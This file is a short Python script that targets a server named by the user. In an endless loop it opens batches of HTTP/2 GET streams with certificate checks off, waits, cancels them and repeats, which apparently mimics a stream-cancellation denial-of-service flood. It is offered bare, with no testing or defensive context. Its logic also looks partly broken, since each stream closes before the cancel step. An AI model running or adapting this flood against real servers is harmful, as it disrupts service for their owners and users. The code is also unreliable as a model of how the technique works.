import httpx
import time

def main():
    # Prompt the user for the server name
    server_name = input("Enter the server name you want to connect to (e.g., example.com): ")

    # Ask the user for the number of requests to open in each batch
    try:
        batch_size = int(input("Enter the number of requests to open in each batch: "))
    except ValueError:
        print("Invalid input. Please enter a valid number.")
        return

    # Duration to wait before canceling the streams
    wait_duration = 5  # seconds

    # Create an HTTP/2 client
    with httpx.Client(http2=True, verify=False) as client:  # Note: verify=False disables SSL verification
        while True:
            # List of paths (for demonstration purposes)
            paths = ['/path{}'.format(i) for i in range(1, batch_size + 1)]

            # List to store the response objects for each stream
            responses = []

            # Open a batch of streams
            for idx, path in enumerate(paths, 1):
                url = f"https://{server_name}{path}"
                try:
                    with client.stream("GET", url) as response:
                        responses.append(response)
                        print(f"Sent stream request {idx} with path {path}.")
                except httpx.RequestError as exc:
                    print(f"An error occurred while requesting {exc.request.url!r}.")

            # Wait for the specified duration
            print(f"Waiting for {wait_duration} seconds...")
            time.sleep(wait_duration)

            # Cancel the streams
            for response in responses:
                response.close()
            print(f"Canceled {batch_size} streams.")

            # Wait for a short duration before starting the next batch
            time.sleep(1)

if __name__ == "__main__":
    main()
